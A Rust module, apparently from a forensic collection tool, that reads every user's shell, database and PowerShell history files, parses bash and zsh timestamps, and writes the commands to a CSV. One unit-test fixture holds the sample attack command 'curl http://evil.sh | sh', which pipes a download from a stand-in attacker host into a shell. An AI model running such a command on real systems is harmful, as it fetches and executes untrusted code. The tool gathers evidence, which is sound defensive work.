//! Shell 命令历史采集：遍历所有用户的家目录，解析 bash/zsh/ksh/python/mysql 等
//! history 文件。支持 zsh 扩展时间戳（`: <epoch>:<duration>;<cmd>`）和
//! bash 的 `#<epoch>` 时间戳行。

use std::fs;

use serde::Serialize;

use crate::error::Result;
use crate::model::CollectionError;
use crate::output::paths::OutputLayout;
use crate::output::writers;

use super::{passwd_entries, push_collection_error};

const HEADER: &str = "user,home_dir,history_file,line_no,timestamp,command\n";
/// 单个 history 文件最大解析行数。
const MAX_LINES_PER_FILE: usize = 50_000;
/// 单条命令最大保留长度。
const MAX_COMMAND_LEN: usize = 2_048;
/// 单文件最大读取字节数。
const MAX_FILE_BYTES: u64 = 16 * 1024 * 1024;

#[derive(Debug, Clone, Serialize)]
struct HistoryRow {
    user: String,
    home_dir: String,
    history_file: String,
    line_no: u64,
    timestamp: String,
    command: String,
}

pub fn collect(
    layout: &OutputLayout,
    errors: &mut Vec<CollectionError>,
    redact: bool,
) -> Result<()> {
    let mut rows = Vec::new();
    for (user, home, _shell) in passwd_entries() {
        let candidates = [
            ".bash_history",
            ".zsh_history",
            ".sh_history",
            ".ksh_history",
            ".python_history",
            ".mysql_history",
            ".psql_history",
            ".sqlite_history",
            ".local/share/fish/fish_history",
            ".config/fish/fish_history",
            ".local/share/powershell/PSReadLine/ConsoleHost_history.txt",
        ];
        for name in candidates {
            let path = home.join(name);
            let Ok(metadata) = fs::metadata(&path) else {
                continue;
            };
            if !metadata.is_file() || metadata.len() > MAX_FILE_BYTES {
                continue;
            }
            parse_history_file(&user, &home, &path, &mut rows, errors);
        }
    }
    if redact {
        for row in &mut rows {
            row.command = crate::safety::redact_text(&row.command);
        }
    }
    if rows.is_empty() {
        writers::write_text(&layout.shell_history, HEADER)
    } else {
        writers::write_csv_serialize(&layout.shell_history, &rows)
    }
}

fn parse_history_file(
    user: &str,
    home: &std::path::Path,
    path: &std::path::Path,
    rows: &mut Vec<HistoryRow>,
    errors: &mut Vec<CollectionError>,
) {
    let bytes = match fs::read(path) {
        Ok(bytes) => bytes,
        Err(error) => {
            push_collection_error(
                errors,
                "shell_history",
                path.display().to_string(),
                "read_history",
                "history file could not be read (permission)",
                Some(error.to_string()),
            );
            return;
        }
    };
    // GBK 等非 UTF-8 历史文件：lossy 解码保留证据内容（无效字节替换为 U+FFFD），
    // 不再因严格 UTF-8 校验失败而整文件丢弃。
    let content = String::from_utf8_lossy(&bytes);
    // 记录文件级解析行数，保证多行命令时间戳沿用机制不丢上下文。
    let mut pending_epoch: Option<i64> = None;
    for (index, line) in content.lines().take(MAX_LINES_PER_FILE).enumerate() {
        let line_no = (index + 1) as u64;
        let trimmed = line.trim_end_matches('\r');
        if trimmed.is_empty() {
            continue;
        }
        // zsh 扩展历史：`: 1699999999:0;curl http://...`
        // 用分号切分，避免 URL 中的冒号干扰。
        if let Some(rest) = trimmed.strip_prefix(':') {
            if let Some((meta, command)) = rest.split_once(';') {
                let epoch = meta.split(':').next().unwrap_or("").trim();
                if let Ok(epoch_value) = epoch.parse::<i64>() {
                    push_row(rows, user, home, path, line_no, Some(epoch_value), command);
                    pending_epoch = None;
                    continue;
                }
            }
        }
        // bash 时间戳行：`#1699999999`，作用于下一条命令。
        if trimmed.len() > 1 && trimmed.starts_with('#') {
            if let Ok(epoch) = trimmed[1..].trim().parse::<i64>() {
                pending_epoch = Some(epoch);
                continue;
            }
        }
        let (epoch, command) = match trimmed.strip_suffix('\\') {
            Some(_) => (pending_epoch, trimmed),
            None => (pending_epoch.take(), trimmed),
        };
        push_row(rows, user, home, path, line_no, epoch, command);
    }
}

fn push_row(
    rows: &mut Vec<HistoryRow>,
    user: &str,
    home: &std::path::Path,
    path: &std::path::Path,
    line_no: u64,
    epoch: Option<i64>,
    command: &str,
) {
    let mut command = command.trim().to_string();
    if command.len() > MAX_COMMAND_LEN {
        let mut end = MAX_COMMAND_LEN;
        while end > 0 && !command.is_char_boundary(end) {
            end -= 1;
        }
        command.truncate(end);
        command.push_str("...(truncated)");
    }
    if command.is_empty() {
        return;
    }
    rows.push(HistoryRow {
        user: user.to_string(),
        home_dir: home.display().to_string(),
        history_file: path.display().to_string(),
        line_no,
        timestamp: epoch
            .map(crate::time_utils::format_epoch_iso)
            .unwrap_or_default(),
        command,
    });
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rows_from(content: &str) -> Vec<HistoryRow> {
        use std::sync::atomic::{AtomicU32, Ordering};
        static SEQ: AtomicU32 = AtomicU32::new(0);
        let seq = SEQ.fetch_add(1, Ordering::Relaxed);
        let dir = std::env::temp_dir().join(format!(
            "dumpall-history-test-{}-{}",
            std::process::id(),
            seq
        ));
        let _ = std::fs::create_dir_all(&dir);
        let path = dir.join(".bash_history");
        std::fs::write(&path, content).unwrap();
        let mut rows = Vec::new();
        let mut errors = Vec::new();
        parse_history_file("root", &dir, &path, &mut rows, &mut errors);
        let _ = std::fs::remove_file(&path);
        rows
    }

    #[test]
    fn parses_bash_timestamps() {
        let rows = rows_from("#1700000000\nwhoami\n#1700000100\nid -u\nuname -a\n");
        assert_eq!(rows.len(), 3);
        assert_eq!(rows[0].command, "whoami");
        assert!(!rows[0].timestamp.is_empty());
        assert_eq!(rows[2].command, "uname -a");
        assert!(rows[2].timestamp.is_empty());
    }

    #[test]
    fn parses_zsh_extended_history() {
        let rows = rows_from(": 1700000000:0;curl http://evil.sh | sh\nplain-command\n");
        assert_eq!(rows.len(), 2);
        assert_eq!(rows[0].command, "curl http://evil.sh | sh");
        assert!(!rows[0].timestamp.is_empty());
    }

    #[test]
    fn skips_comment_like_lines_without_epoch() {
        let rows = rows_from("# just a comment\necho hi\n");
        assert_eq!(rows.len(), 2);
        assert_eq!(rows[0].command, "# just a comment");
        assert_eq!(rows[1].command, "echo hi");
    }

    #[test]
    fn gbk_history_content_is_retained_lossily() {
        // GBK 编码的命令（"中文" = D6 D0 CE C4）：严格 UTF-8 读取会整文件丢弃，
        // lossy 读取应保留命令行（无效字节替换）。
        use std::sync::atomic::{AtomicU32, Ordering};
        static SEQ: AtomicU32 = AtomicU32::new(0);
        let seq = SEQ.fetch_add(1, Ordering::Relaxed);
        let dir = std::env::temp_dir().join(format!(
            "dumpall-history-gbk-{}-{}",
            std::process::id(),
            seq
        ));
        let _ = std::fs::create_dir_all(&dir);
        let path = dir.join(".bash_history");
        std::fs::write(&path, b"echo \xd6\xd0\xce\xc4\nwhoami\n").unwrap();
        let mut rows = Vec::new();
        let mut errors = Vec::new();
        parse_history_file("root", &dir, &path, &mut rows, &mut errors);
        assert_eq!(rows.len(), 2);
        assert!(rows[0].command.contains("echo"));
        assert!(errors.is_empty());
        let _ = std::fs::remove_file(&path);
    }
}
